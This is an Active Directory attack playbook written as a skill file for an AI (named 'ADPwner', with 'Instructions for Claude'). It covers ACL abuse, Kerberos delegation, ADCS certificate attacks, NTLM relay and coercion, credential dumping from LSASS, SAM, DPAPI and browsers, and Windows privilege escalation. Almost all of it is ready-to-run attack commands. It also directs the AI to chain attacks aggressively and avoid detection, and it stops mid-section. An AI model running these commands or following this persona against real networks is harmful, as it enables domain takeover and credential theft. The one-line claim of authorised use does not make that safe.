# SKILL: Active Directory Red Team — ACL Abuse, Delegation, ADCS & Windows Privilege Escalation

## Metadata
- **Skill Name**: ADPwner
- **Author**: rajchowdhury240
- **Reference**: https://rajchowdhury240.github.io/AD/ACL-Abuse
- **Scope**: Authorized red team / pentest / HTB / engagements only

## Description
End-to-end Active Directory exploitation playbook focused on:
- BloodHound-driven ACL edge abuse (every dangerous edge with PoC)
- Kerberos delegation abuse (unconstrained, constrained, RBCD, SPN-less RBCD, S4U2self abuse)
- ADCS ESC1–ESC15 + Shadow Credentials (PKINIT)
- Machine Account Quota, SID History injection, AdminSDHolder
- Windows token privileges (SeImpersonate, SeAssignPrimaryToken, SeBackup, SeRestore, SeDebug, SeLoadDriver, SeTakeOwnership, SeManageVolume, SeTcb, SeCreateToken)
- Credential loot (DPAPI, PSReadLine console history, clipboard history, LSASS, SAM/SECURITY, Vault, browsers)
- Kerberos ticket attacks (Kerberoast, AS-REP roast, Golden/Silver/Diamond/Sapphire, S4U)
- NTLM relay → AD takeover chains

## Trigger Phrases
`active directory, AD, BloodHound, ACL abuse, GenericAll, GenericWrite, WriteDACL, WriteOwner, ForceChangePassword, AddSelf, AddKeyCredentialLink, shadow credentials, ADCS, certipy, ESC1, ESC8, RBCD, resource based delegation, unconstrained, constrained delegation, S4U, Kerberoast, ASREP, DCSync, machine account quota, MAQ, SID history, AdminSDHolder, golden ticket, silver ticket, diamond ticket, sapphire ticket, NTLM relay, ntlmrelayx, SeImpersonate, SeBackup, SeRestore, SeDebug, SeLoadDriver, SeTakeOwnership, DPAPI, PSReadLine, LAPS, gMSA, LSASS, secretsdump, mimikatz, rubeus, impacket, bloodyAD, certipy`

## Instructions for Claude
1. **Always start with recon**: identify domain, users, groups, computers, GPOs, trusts, ACLs. Feed BloodHound first.
2. **Never blast loud tools** before passive enum. Respect OPSEC unless engagement allows noise.
3. For every edge/path: explain *why* it works, *prereqs*, *exact command*, *post-exploit chain*.
4. Prefer **Linux Impacket / bloodyAD / certipy** from foothold; switch to **Rubeus / SharpHound / PowerView / Whisker** when on Windows.
5. Chain edges aggressively (e.g. GenericWrite → targeted Kerberoast → crack → ForceChangePassword → DCSync).
6. Detect blockers (PKINIT disabled, LDAPS-only, SMB signing, EPA, Channel Binding, Protected Users, ASREP not allowed) and pivot.

---

## 1. Recon & BloodHound Ingest

### 1.1 Collection
**Linux (no creds → creds):**
```bash
# Anonymous null bind enum
nxc smb DC01 -u '' -p '' --shares
nxc ldap DC01 -u '' -p ''
rpcclient -U '' -N DC01

# With creds — BloodHound.py
bloodhound-python -u 'user' -p 'pass' -d domain.local -ns 10.0.0.1 -c All --zip
# Stealth (no SMB session enum)
bloodhound-python -u user -p pass -d domain.local -ns DC -c DCOnly,Group,Container

# With Kerberos ticket
KRB5CCNAME=user.ccache bloodhound-python -k -u user -d domain.local -c All --zip --dns-tcp
```

**Windows:**
```powershell
# SharpHound .NET
.\SharpHound.exe -c All --zipfilename loot.zip
# PowerShell collector
. .\SharpHound.ps1; Invoke-BloodHound -CollectionMethod All
# Stealth
.\SharpHound.exe -c DCOnly --excludedcs
```

**ADCS-aware (Certipy):**
```bash
certipy find -u user@domain.local -p pass -dc-ip DC -vulnerable -stdout
certipy find -u user@domain.local -p pass -bloodhound -old-bloodhound  # produce BH JSON
```

### 1.2 Critical Cypher queries (BloodHound CE)
```cypher
// Owned → DA path
MATCH p=shortestPath((u:User {owned:true})-[*1..]->(g:Group {name:'DOMAIN ADMINS@DOMAIN.LOCAL'})) RETURN p

// All ACL edges from owned principals
MATCH p=(s {owned:true})-[r:GenericAll|GenericWrite|WriteDacl|WriteOwner|Owns|AddMember|ForceChangePassword|AllExtendedRights|AddKeyCredentialLink|AddSelf|WriteSPN|ReadGMSAPassword|ReadLAPSPassword|SyncLAPSPassword|WriteAccountRestrictions|GPLink]->(t) RETURN p

// Kerberoastable Tier 0
MATCH (u:User {hasspn:true}) WHERE u.admincount=true RETURN u.name

// AS-REP roastable
MATCH (u:User {dontreqpreauth:true}) RETURN u.name

// Unconstrained delegation
MATCH (c:Computer {unconstraineddelegation:true}) RETURN c.name

// Constrained w/ protocol transition (S4U abuse)
MATCH (c {trustedtoauth:true}) RETURN c.name, c.allowedtodelegate

// RBCD candidates (writeable msDS-AllowedToActOnBehalfOfOtherIdentity via GenericWrite/All on computer)
MATCH p=(s {owned:true})-[:GenericAll|GenericWrite|WriteDacl|WriteOwner]->(c:Computer) RETURN p

// ESC1-style certificate templates
MATCH (t:GPO) WHERE t.name CONTAINS 'Cert' RETURN t  // weak; use certipy find
```

---

## 2. ACL Edge Abuse Catalog

### 2.1 GenericAll (user/group/computer)
**On user → reset password, AddKeyCredentialLink (shadow creds), targeted Kerberoast**
```bash
# Password reset (Linux)
net rpc password TARGET 'NewP@ss1!' -U 'DOMAIN/owned%pass' -S DC01
bloodyAD -d domain.local -u owned -p pass --host DC01 set password TARGET 'NewP@ss1!'
rpcchangepwd.py domain.local/owned:pass@DC01 -newpass 'NewP@ss1!' -altuser TARGET

# Shadow Credentials (PKINIT must be enabled — ADCS CA present)
certipy shadow auto -u owned@domain.local -p pass -account TARGET
pywhisker -d domain.local -u owned -p pass --target TARGET --action add

# Targeted Kerberoast (set SPN, roast, unset)
targetedKerberoast.py -v -d domain.local -u owned -p pass
```

**On group → AddMember**
```bash
net rpc group addmem 'Domain Admins' owned -U 'DOMAIN/owned%pass' -S DC01
bloodyAD -d domain.local -u owned -p pass --host DC01 add groupMember 'Domain Admins' owned
```

**On computer → RBCD or Shadow Creds**
```bash
# RBCD (preferred — works without password reset, more OPSEC-safe)
addcomputer.py -computer-name 'attacker$' -computer-pass 'Pwn123!' -dc-host DC01 'domain.local/owned:pass'
rbcd.py -delegate-from 'attacker$' -delegate-to 'TARGET$' -dc-ip DC -action write 'domain.local/owned:pass'
getST.py -spn 'cifs/TARGET.domain.local' -impersonate Administrator 'domain.local/attacker$:Pwn123!'
export KRB5CCNAME=Administrator.ccache
secretsdump.py -k -no-pass TARGET.domain.local
```

### 2.2 GenericWrite
- On user: write `servicePrincipalName` → targeted Kerberoast; write `msDS-KeyCredentialLink` (if also on writeable attribute) → shadow creds
- On group: cannot AddMember directly (need WriteProperty on `member` — usually included). Try:
```bash
bloodyAD -d domain.local -u owned -p pass --host DC -p set object 'CN=Group,...' member 'CN=owned,...'
```
- On computer: same as GenericAll for RBCD if `msDS-AllowedToActOnBehalfOfOtherIdentity` writeable.

### 2.3 WriteDACL
Grant yourself any right on the target.
```bash
dacledit.py -action write -rights FullControl -principal owned -target TARGET 'domain.local/owned:pass'
# Then exploit as GenericAll
```
**On domain object → DCSync:**
```bash
dacledit.py -action write -rights DCSync -principal owned -target-dn 'DC=domain,DC=local' 'domain.local/owned:pass'
secretsdump.py domain.local/owned:pass@DC -just-dc
```

### 2.4 WriteOwner / Owns
Attacker becomes owner → owner has implicit `WriteDACL`+`ReadControl`.
```bash
bloodyAD -d domain.local -u owned -p pass --host DC set owner TARGET owned
bloodyAD -d domain.local -u owned -p pass --host DC add genericAll TARGET owned
# Now exploit as GenericAll
```
**OwnsRaw / WriteOwnerRaw / OwnsLimitedRights** (BHCE 5.0): same idea, may require WriteDACL chain.

### 2.5 ForceChangePassword
```bash
net rpc password TARGET 'NewP@ss!' -U 'DOMAIN/owned%pass' -S DC
bloodyAD -d domain.local -u owned -p pass --host DC set password TARGET 'NewP@ss!'
rpcchangepwd.py domain.local/owned:pass@DC -newpass 'NewP@ss!' -altuser TARGET
```
**OPSEC:** breaks user; prefer Shadow Creds when possible.

### 2.6 AddMember / AddSelf
```bash
net rpc group addmem 'Privileged Group' owned -U 'DOMAIN/owned%pass'
bloodyAD ... add groupMember 'Privileged Group' owned
# AddSelf → only self
```

### 2.7 AllExtendedRights
Includes `User-Force-Change-Password`, `DS-Replication-Get-Changes` (DCSync prereq) when on domain root.
```bash
secretsdump.py domain.local/owned:pass@DC -just-dc-ntlm
```

### 2.8 AddKeyCredentialLink → Shadow Credentials
**Prereqs:** ADCS or Domain Controllers with PKINIT support (default 2016+ if KDC cert).
```bash
# Linux
certipy shadow auto -u owned@domain.local -p pass -account TARGET
# Manual
certipy shadow add -u owned -p pass -account TARGET
gettgtpkinit.py -cert-pfx out.pfx -pfx-pass '' domain.local/TARGET tgt.ccache
getnthash.py -key <as-rep-key> domain.local/TARGET
```
**Windows:** `Whisker.exe add /target:TARGET$` → `Rubeus.exe asktgt /user:TARGET$ /certificate:... /getcredentials`

### 2.9 WriteSPN
Set SPN → Kerberoast.
```bash
targetedKerberoast.py -v -d domain.local -u owned -p pass
hashcat -m 13100 hash.txt rockyou.txt -r OneRuleToRuleThemAll.rule
```

### 2.10 WriteAccountRestrictions
Toggle `userAccountControl` flags: disable preauth → AS-REP roast offline crackable.
```bash
bloodyAD -d domain.local -u owned -p pass --host DC add uac TARGET -f DONT_REQ_PREAUTH
GetNPUsers.py domain.local/ -usersfile users -no-pass
```

### 2.11 ReadLAPSPassword / ReadGMSAPassword / SyncLAPSPassword
```bash
nxc ldap DC -u owned -p pass --laps
nxc ldap DC -u owned -p pass --gmsa
gMSADumper.py -u owned -p pass -d domain.local
# LAPSv2 (encrypted)
nxc ldap DC -u owned -p pass --laps --laps-pwd
```

### 2.12 GPLink / WriteGPLink / GPO control (AddAllowedToAct on OU, GenericAll on GPO)
```bash
pyGPOAbuse.py domain.local/owned:pass -gpo-id <GUID> --user-task --command 'net user attacker P@ss /add ...'
# Or SharpGPOAbuse on Windows
SharpGPOAbuse.exe --AddComputerTask --TaskName upd --Author NT_AUTH --Command cmd.exe --Arguments "/c net group ..." --GPOName "Default Domain Policy"
```

### 2.13 AdminSDHolder abuse
If GenericAll on `CN=AdminSDHolder,CN=System,DC=...` → SDProp re-stamps every protected group (DA, EA, etc.) with attacker DACL ~60 min.
```bash
dacledit.py -action write -rights FullControl -principal owned -target-dn 'CN=AdminSDHolder,CN=System,DC=domain,DC=local' 'domain.local/owned:pass'
# Wait for SDProp → DA on attacker
```

### 2.14 DCSync rights (`DS-Replication-Get-Changes` + `-All` + `-In-Filtered-Set`)
```bash
secretsdump.py domain.local/owned:pass@DC -just-dc
secretsdump.py 'domain.local/owned:pass@DC' -just-dc-user krbtgt
nxc smb DC -u owned -p pass --ntds  # uses VSS or DRSUAPI
```

---

## 3. Kerberos Delegation Attacks

### 3.1 Unconstrained Delegation (TRUSTED_FOR_DELEGATION)
Target server stores any TGT → coerce DC to authenticate → capture TGT → DCSync.
```bash
# Identify
nxc ldap DC -u owned -p pass --trusted-for-delegation
# On compromised unconstrained host
.\Rubeus.exe monitor /interval:1 /nowrap
# Coerce DC$ via PetitPotam/PrinterBug/DFSCoerce/ShadowCoerce
PetitPotam.py -u owned -p pass -d domain.local UnconstrainedHost DC
coercer coerce -u owned -p pass -d domain.local -t DC -l UnconstrainedHost
# DC$ TGT lands in Rubeus → s4u or DCSync
```

### 3.2 Constrained Delegation (msDS-AllowedToDelegateTo)
**Without protocol transition** (`TrustedToAuthForDelegation=False`): can only impersonate users that already authenticated to attacker via Kerberos.
**With protocol transition** (S4U2self+S4U2proxy): impersonate any non-Protected user.
```bash
getST.py -spn 'cifs/target.domain.local' -impersonate Administrator domain.local/svc:pass
# Cross-protocol abuse — request alt service
getST.py -spn 'http/target' -altservice 'cifs/target' -impersonate Administrator ...
# 'sensitive=true' or Protected Users → cannot impersonate
```

### 3.3 Resource-Based Constrained Delegation (RBCD)
Need: write to `msDS-AllowedToActOnBehalfOfOtherIdentity` on victim + control of an account with SPN.
```bash
# Add fake computer (uses MachineAccountQuota=10)
addcomputer.py -computer-name 'evil$' -computer-pass 'Pwn1!' -dc-host DC -domain-netbios DOMAIN 'domain.local/owned:pass'
# Set RBCD
rbcd.py -delegate-from 'evil$' -delegate-to 'VICTIM$' -dc-ip DC -action write 'domain.local/owned:pass'
# S4U
getST.py -spn 'cifs/VICTIM.domain.local' -impersonate Administrator 'domain.local/evil$:Pwn1!'
KRB5CCNAME=Administrator.ccache wmiexec.py -k -no-pass VICTIM.domain.local
```

### 3.4 SPN-less RBCD (no MAQ, no machine account)
Use **U2U (User-to-User)** + **S4U2self** to forge usable service ticket without needing SPN on attacker principal.
```bash
# Requires only a user account; bypasses MAQ=0
getST.py -self -impersonate Administrator -altservice 'cifs/VICTIM.domain.local' -u2u 'domain.local/owned:pass'
# Or modern impacket: -no-s4uproxy / -force-forwardable
```
Useful when MAQ=0 blocks `addcomputer` and you only have a user with WriteDACL on victim.

### 3.5 S4U2self Abuse (no delegation flags) — "U2U"
With any account + GenericAll on a computer: request S4U2self to self → forwardable ticket → use as RBCD source even without SPN.
```bash
getST.py -self -altservice 'host/VICTIM' -impersonate Administrator domain.local/owned:pass -u2u
```

### 3.6 KrbRelay / KrbRelayUp (local privesc via RBCD on self)
```cmd
KrbRelayUp.exe full /Domain:domain.local /CreateNewComputerAccount /Verbose
```

### 3.7 Sapphire Ticket / Diamond Ticket
- **Diamond**: modify legitimate TGT PAC (avoids encrypted-ticket-only golden detection).
- **Sapphire**: request TGT via S4U2self+U2U for high-priv account, get real PAC from DC.
```bash
ticketer.py -nthash <krbtgt> -domain-sid S-1-5-21-... -domain domain.local -request -user owned -password pass -dc-ip DC Administrator
# Diamond mode → modify existing
ticketer.py ... -duration 36000 -groups 512,513,518,519,520
```

---

## 4. ADCS Abuse (ESC1–ESC15)

### 4.1 Enumerate
```bash
certipy find -u owned@domain.local -p pass -dc-ip DC -vulnerable -stdout
certipy find -u owned -p pass -dc-ip DC -enabled -text -output certs
```

### 4.2 ESC1 — Enrollee Supplies Subject + Client Auth EKU
```bash
certipy req -u owned@domain.local -p pass -ca CA-NAME -template VulnTemplate -upn Administrator@domain.local -dns DC.domain.local
certipy auth -pfx administrator.pfx -dc-ip DC
```

### 4.3 ESC2 — Any Purpose / SubCA EKU → forge any cert
Same as ESC1 but template has `Any Purpose` or no EKU.

### 4.4 ESC3 — Enrollment Agent
```bash
certipy req -u owned -p pass -ca CA -template EnrollmentAgent
certipy req -u owned -p pass -ca CA -template User -on-behalf-of 'DOMAIN\Administrator' -pfx agent.pfx
```

### 4.5 ESC4 — Vulnerable template ACL
WriteOwner/WriteDACL/GenericAll/GenericWrite on template object.
```bash
certipy template -u owned -p pass -template VulnTemplate -save-old
# certipy auto-modifies template → ESC1 → restore
```

### 4.6 ESC5 — PKI object ACL
GenericAll on CA object, NTAuthCertificates, or Configuration container → forge trusted CA → golden cert.

### 4.7 ESC6 — `EDITF_ATTRIBUTESUBJECTALTNAME2` flag on CA
Any cert template enrollable → supply SAN → impersonate.
```bash
certipy req -u owned -p pass -ca CA -template User -upn Administrator@domain.local
```

### 4.8 ESC7 — CA ACL (ManageCA / ManageCertificates)
```bash
certipy ca -u owned -p pass -ca CA -add-officer owned
certipy ca -u owned -p pass -ca CA -enable-template SubCA
certipy req -u owned -p pass -ca CA -template SubCA -upn Administrator@domain.local  # fails → issue manually
certipy ca -u owned -p pass -ca CA -issue-request <reqId>
certipy req -u owned -p pass -ca CA -retrieve <reqId>
```

### 4.9 ESC8 — HTTP/S enrollment + NTLM relay → cert
```bash
# Coerce DC$ → relay to /certsrv (HTTP) or /certsrv (HTTPS — needs no EPA)
ntlmrelayx.py -t http://CA/certsrv/certfnsh.asp -smb2support --adcs --template DomainController
PetitPotam.py -u '' -p '' DC@80/Pipe/lsarpc DC  # unauthenticated on unpatched
# Use returned cert
certipy auth -pfx dc.pfx -dc-ip DC
```

### 4.10 ESC9 — `no-security-extension` (msDS-MappingFlags / StrongCertificateBindingEnforcement=Disabled)
UPN spoofing on cert without SID extension.

### 4.11 ESC10 — Weak certificate mapping (registry: CertificateMappingMethods=0x4)
Same UPN-spoof pattern post-May 2022 patch when admins downgrade.

### 4.12 ESC11 — RPC over IF_ENFORCEENCRYPTICERTREQUEST=0 → relay ICPR
```bash
ntlmrelayx.py -t rpc://CA -rpc-mode ICPR -icpr-ca-name CA --adcs --template DomainController
```

### 4.13 ESC13 — OID group link on template (issuance policy → group membership)
Enroll cert with OID linked to high-priv group → token has SID.
```bash
certipy req -u owned -p pass -ca CA -template OIDLinked
certipy auth -pfx out.pfx
```

### 4.14 ESC14 — Weak explicit mapping (altSecurityIdentities writeable on victim)
Write `altSecurityIdentities` on TARGET → enroll your cert → auth as TARGET.

### 4.15 ESC15 — EKUwu (CVE-2024-49019) on V1 templates
V1 schema templates allow arbitrary EKU/SAN injection in CSR.
```bash
certipy req -u owned -p pass -ca CA -template WebServer -application-policies 'Client Authentication' -upn Administrator
```

---

## 5. Machine Account Quota (MAQ / ms-DS-MachineAccountQuota)

Default = 10. Any authenticated user can join 10 computers → SPN account → RBCD source.
```bash
# Read MAQ
nxc ldap DC -u owned -p pass -M maq
ldapsearch -H ldap://DC -b 'DC=domain,DC=local' '(objectClass=domain)' ms-DS-MachineAccountQuota

# Add computer (Linux)
addcomputer.py -computer-name 'evil$' -computer-pass 'Pwn1!' -dc-host DC -method LDAPS 'domain.local/owned:pass'
# SAMR (no LDAPS)
addcomputer.py ... -method SAMR
# bloodyAD
bloodyAD -d domain.local -u owned -p pass --host DC add computer evil 'Pwn1!'
```
**MAQ=0 bypass:** SPN-less RBCD via U2U S4U2self (see §3.4) or use any existing controlled user with SPN.

---

## 6. SID History Injection / Trust Abuse

### 6.1 SID History (intra-forest, golden ticket)
Forge TGT with `ExtraSids` → cross-domain DA in parent.
```bash
ticketer.py -nthash <child_krbtgt> -domain-sid S-1-5-21-CHILD -domain child.parent.local \
  -extra-sid S-1-5-21-PARENT-519,S-1-5-21-PARENT-512 Administrator
```
**Sapphire ticket** with extraSids same idea but legit PAC.

### 6.2 Trust Key (inter-realm TGT)
```bash
secretsdump.py child.parent.local/admin@DC -just-dc-user 'parent$'
ticketer.py -nthash <trust_key> -domain-sid S-1-5-21-CHILD -domain child.parent.local \
  -extra-sid S-1-5-21-PARENT-519 -spn krbtgt/parent.local Administrator
getST.py -spn cifs/PARENTDC.parent.local -k -no-pass
```

### 6.3 Foreign Group / Foreign Security Principal
Cypher: `MATCH (n:User)-[:MemberOf*1..]->(g:Group) WHERE g.domain<>n.domain RETURN n,g`

---

## 7. Kerberos Ticket Attacks

### 7.1 Kerberoast (any user with SPN)
```bash
GetUserSPNs.py domain.local/owned:pass -dc-ip DC -request
hashcat -m 13100 hash.txt wordlist -r rules/OneRuleToRuleThemAll.rule
# Targeted (write SPN first)
targetedKerberoast.py -v -d domain.local -u owned -p pass
```

### 7.2 AS-REP Roast (DONT_REQ_PREAUTH)
```bash
GetNPUsers.py domain.local/ -usersfile users.txt -no-pass -dc-ip DC
hashcat -m 18200 hash.txt rockyou.txt
```

### 7.3 Golden Ticket (krbtgt hash)
```bash
ticketer.py -nthash <krbtgt> -domain-sid <S-1-5-21-...> -domain domain.local Administrator
export KRB5CCNAME=Administrator.ccache
psexec.py -k -no-pass DC.domain.local
```

### 7.4 Silver Ticket (service account hash)
```bash
ticketer.py -nthash <svc_nt> -domain-sid ... -domain domain.local -spn cifs/server.domain.local Administrator
```

### 7.5 Diamond / Sapphire — see §3.7

### 7.6 Pass-the-Ticket / Pass-the-Hash / OverPass
```bash
getTGT.py domain.local/user@DC -hashes :NTHASH    # PtH→TGT (overpass)
KRB5CCNAME=user.ccache wmiexec.py -k -no-pass HOST
sekurlsa::pth /user:Administrator /domain:domain.local /ntlm:<hash> /run:cmd.exe
```

---

## 8. NTLM Relay, Reflection & Coercion → AD Compromise

### 8.1 Coercion primitive matrix
| Bug | Protocol | RPC Interface / UUID | Method | Auth required | Patch |
|---|---|---|---|---|---|
| **PrinterBug / SpoolSample** | MS-RPRN | `12345678-1234-abcd-ef00-0123456789ab` | `RpcRemoteFindFirstPrinterChangeNotification(Ex)` | yes (any user) | spooler disable |
| **PetitPotam** | MS-EFSRPC | `c681d488-d850-11d0-8c52-00c04fd90f7e` / `df1941c5-fe89-4e79-bf10-463657acf44d` | `EfsRpcOpenFileRaw`, `EfsRpcEncryptFileSrv`, `EfsRpcDecryptFileSrv`, `EfsRpcQueryUsersOnFile`, `EfsRpcQueryRecoveryAgents`, `EfsRpcRemoveUsersFromFile`, `EfsRpcAddUsersToFile`, `EfsRpcFileKeyInfo`, `EfsRpcDuplicateEncryptionInfoFile` | originally **unauth** (KB5005413), now any user | KB5005413 patches anon |
| **DFSCoerce** | MS-DFSNM | `4fc742e0-4a10-11cf-8273-00aa004ae673` | `NetrDfsAddStdRoot`, `NetrDfsRemoveStdRoot` | yes | not patched (by design) |
| **ShadowCoerce** | MS-FSRVP | `a8e0653c-2744-4389-a61d-7373df8b2292` | `IsPathShadowCopied`, `IsPathSupported` | yes | KB5015527 |
| **MSEven (CheeseOunce)** | MS-EVEN | EventLog Remoting | `ElfrOpenBELW` | yes | partial |
| **WSPCoerce / WspCoerce** | MS-WSP | Search proto | `ConnectIn` | yes | — |
| **PrivExchange** | EWS Push | HTTP | EWS subscribe push | mailbox user | patched 2019 |
| **AuthCoerce / Coercer (one-shot all)** | many | — | tries all above | — | — |

```bash
# coercer — tries every primitive
coercer coerce -u owned -p pass -d domain.local -t VICTIM -l LISTENER --always-continue
coercer scan -u owned -p pass -d domain.local -t VICTIM     # which are exploitable
coercer fuzz  -u owned -p pass -d domain.local -t VICTIM    # find new

# Per-tool
PetitPotam.py -u owned -p pass -d domain.local LISTENER VICTIM
PetitPotam.py LISTENER VICTIM                               # unauth attempt (pre-patch)
dfscoerce.py -u owned -p pass -d domain.local LISTENER DC
printerbug.py 'domain.local/owned:pass'@DC LISTENER
SpoolSample.exe DC LISTENER                                  # Windows
shadowcoerce.py -u owned -p pass -d domain.local LISTENER VICTIM
```

### 8.2 Relay target playbook
```bash
# (a) LDAPS → RBCD on relayed computer
ntlmrelayx.py -t ldaps://DC --delegate-access --escalate-user owned --no-smb-server
# (b) LDAP → add computer / shadow credentials on victim
ntlmrelayx.py -t ldap://DC --add-computer evil --shadow-credentials --shadow-target VICTIM$
# (c) HTTP/HTTPS → ADCS web enrollment (ESC8)
ntlmrelayx.py -t http://CA/certsrv/certfnsh.asp --adcs --template DomainController
ntlmrelayx.py -t https://CA/certsrv/certfnsh.asp --adcs --template DomainController
# (d) RPC → ADCS ICPR (ESC11)
ntlmrelayx.py -t rpc://CA -rpc-mode ICPR -icpr-ca-name 'CA-NAME' --adcs --template DomainController
# (e) SMB (signing not required) → cmd
ntlmrelayx.py -tf smb_no_signing.txt -smb2support -c 'powershell -enc ...'
# (f) MSSQL → SOCKS / xp_cmdshell
ntlmrelayx.py -t mssql://SQL --no-smb-server -socks
# (g) IMAP / SMTP / EWS / WinRM
ntlmrelayx.py -t imap://mail -socks
# (h) Multi-relay (--multirelay) and SOCKS pivot
ntlmrelayx.py -tf targets.txt -socks -smb2support
proxychains psexec.py 'domain.local/RELAYED@target' -no-pass
```

### 8.3 Kerberos relay (krbrelayx)
```bash
# Requires unconstrained delegation OR DNS spoofing of attacker SPN
krbrelayx.py --target ldap://DC -aesKey <hex> --delegate-access --escalate-user owned
addspn.py -u 'domain.local\owned' -p pass -s host/attacker DC
dnstool.py -u 'domain.local\owned' -p pass --record attacker --action add --data ATTACKER_IP DC
```

### 8.4 NTLM Reflection (CVE-2025-33073) — "SMB → SMB to self"
Reflect coerced SMB auth back to **the same machine** over SMB → bypasses MIC + most relay defenses; gives SYSTEM on coerced host.
```bash
# Patched May 2025 — works on unpatched servers
ntlmrelayx.py -t smb://VICTIM -smb2support --no-smb-server -socks
PetitPotam.py -u low -p pass ATTACKER VICTIM       # attacker = relay host on same subnet
# Or use the MS-DFSNM/EFSRPC primitive that allows null/different SPN → reflects
```
Companion: **CVE-2024-43532** (RemoteRegistry NTLM relay), **CVE-2025-21293** (Performance Counters → NTLM coerce), **WebClient (WebDAV) coerce** for cross-protocol HTTP→LDAP relay even on signed SMB nets.

### 8.5 WebClient / WebDAV coerce (HTTP-based, bypasses SMB signing)
```bash
# Spin up WebDAV listener, coerce target into HTTP auth
PetitPotam.py -u low -p pass 'attacker@80/test' VICTIM
# Then relay HTTP NTLM to LDAP (no signing on LDAP by default if CB off)
ntlmrelayx.py -t ldap://DC --delegate-access --escalate-user owned -smb2support
# Trigger WebDAV via search-ms / autodiscover / printerbug w/ FQDN@port@path
SearchConnector.exe target  # SearchIndexer triggers WebClient
```

### 8.6 Signing / EPA / Channel Binding matrix
```bash
nxc smb subnet -u '' -p '' --gen-relay-list relay.txt
nxc ldap DC -u owned -p pass -M ldap-checker            # signing/CB on LDAP
nxc smb DC -u owned -p pass -M smb-signing              # signing required?
nxc smb subnet -u low -p pass -M webdav                 # WebClient enabled?
```
| Defense | Bypass |
|---|---|
| SMB signing required | use HTTP/LDAP/MSSQL relay paths, or WebDAV coerce |
| LDAP signing | relay to LDAPS |
| LDAPS Channel Binding | downgrade via WebDAV (HTTP → LDAP), or ESC8 (`certsrv` web) |
| EPA on /certsrv | RPC ICPR (ESC11) instead |
| Protected Users / RC4 disabled | use AES, request PKINIT |

---

## 9. Credential Loot on Hosts

### 9.1 LSASS
```cmd
:: Mimikatz
sekurlsa::logonpasswords
sekurlsa::ekeys
:: nanodump (OPSEC)
nanodump.exe -w lsass.dmp
:: pypykatz offline
pypykatz lsa minidump lsass.dmp
:: comsvcs.dll (LOLBin)
rundll32 C:\Windows\System32\comsvcs.dll MiniDump <PID> C:\loot\l.dmp full
```

### 9.2 SAM / SECURITY / SYSTEM
```cmd
reg save HKLM\SAM sam.sav
reg save HKLM\SYSTEM sys.sav
reg save HKLM\SECURITY sec.sav
secretsdump.py -sam sam -system sys -security sec LOCAL
```

### 9.3 DPAPI
```cmd
:: User MasterKeys
dir %APPDATA%\Microsoft\Protect\<SID>\
mimikatz # sekurlsa::dpapi
mimikatz # dpapi::masterkey /in:MASTERKEY /sid:<SID> /password:<usrpass>
:: System MasterKey (DPAPI_SYSTEM secret from LSA)
mimikatz # !sekurlsa::dpapisystem
:: Decrypt blobs
dpapi::cred /in:Credential /masterkey:<KEY>
dpapi::chrome /in:"%LOCALAPPDATA%\Google\Chrome\User Data\Default\Login Data" /masterkey:<KEY>
:: Linux offline
impacket-dpapi masterkey -file MASTERKEY -password 'pass' -sid S-1-5-21-...
impacket-dpapi credential -file CRED -masterkey <key>
:: Domain backup key (DA-only) → decrypt every user's DPAPI
mimikatz # lsadump::backupkeys /system:DC /export
```

### 9.4 PSReadLine console history (huge win, often forgotten)
```powershell
Get-Content (Get-PSReadlineOption).HistorySavePath
type "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
# Per all users on host
gci C:\Users\*\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt -EA 0 | %{ Write-Host $_; gc $_ }
```
cmd.exe history not persisted. WSL: `~/.bash_history`.

### 9.5 Clipboard history (Win10+)
```powershell
# Live
Get-Clipboard
Add-Type -AssemblyName System.Windows.Forms; [Windows.Forms.Clipboard]::GetText()
# Persistent (if enabled)
Get-ChildItem "$env:LOCALAPPDATA\Microsoft\Windows\Clipboard\" -Recurse
# Cloud-synced clipboard via Microsoft Account → relevant in tenant compromise
```

### 9.6 Credential Manager / Vault
```cmd
vaultcmd /list
vaultcmd /listcreds:"Web Credentials" /all
cmdkey /list
mimikatz # vault::list
mimikatz # vault::cred /patch
```

### 9.7 Browsers (Chrome/Edge/Firefox)
```bash
SharpChrome.exe logins /unprotect
SharpChrome.exe cookies /unprotect
firefox_decrypt.py
# Edge — same as Chrome (DPAPI)
```

### 9.8 LSA Secrets / Cached
```bash
secretsdump.py -sam ... -security ... LOCAL
# DCC2 hashes → hashcat -m 2100
# LSA secrets → service account passwords plaintext, $MACHINE.ACC, DPAPI_SYSTEM
```

### 9.9 Kerberos tickets on disk
```cmd
klist
mimikatz # sekurlsa::tickets /export
Rubeus.exe dump /service:krbtgt /nowrap
Rubeus.exe triage
```

### 9.10 Files
```powershell
gci C:\ -Include *.kdbx,*.config,web.config,unattend.xml,sysprep.xml,*.vmdk,*.bak,*.ps1,*.bat,id_rsa* -Recurse -EA 0
findstr /SI /M "password" *.xml *.ini *.txt *.config
# SYSVOL Group Policy Preferences cpassword
nxc smb DC -u owned -p pass -M gpp_password
```

---

## 10. Windows Token / Privilege Escalation

### 10.1 Enumeration
```cmd
whoami /priv
whoami /groups
seatbelt -group=All
winPEAS.exe quiet cmd
```

### 10.2 SeImpersonatePrivilege / SeAssignPrimaryTokenPrivilege
"Potato" family — coerce SYSTEM auth, relay to local RPC.
```cmd
:: Modern (works post-2022 patches)
GodPotato.exe -cmd "cmd /c whoami"
:: Server family
JuicyPotatoNG.exe -t * -p cmd.exe -a "/c whoami"
PrintSpoofer.exe -i -c cmd.exe       :: needs Print Spooler
RoguePotato.exe -r <attacker_ip> -e cmd.exe -l 9999
SweetPotato.exe -p cmd.exe
EfsPotato.exe "cmd /c whoami"
LocalPotato.exe -cmd cmd.exe
DCOMPotato.exe
```

### 10.3 SeBackupPrivilege + SeRestorePrivilege
**SeBackup**: read any file, including `NTDS.dit`.
```cmd
:: From DC with SeBackup (e.g. Backup Operators)
diskshadow.exe /s diskshadow.txt
:: diskshadow.txt:
:: set context persistent nowriters
:: add volume C: alias backup
:: create
:: expose %backup% Z:
robocopy /b Z:\Windows\NTDS . NTDS.dit
reg save HKLM\SYSTEM SYSTEM /y
secretsdump.py -ntds NTDS.dit -system SYSTEM LOCAL
```
**SeRestore**: write to any file → drop DLL in protected path, replace SYSTEM service binary, modify `utilman.exe`/`sethc.exe`.
```cmd
:: With SeRestore + SeTakeOwnership often paired
:: Replace service binary or AlwaysInstallElevated MSI
:: Or modify HKLM\SYSTEM\CurrentControlSet\Services\* ImagePath
```
PowerShell helper:
```powershell
Import-Module .\SeBackupPrivilegeUtils.dll
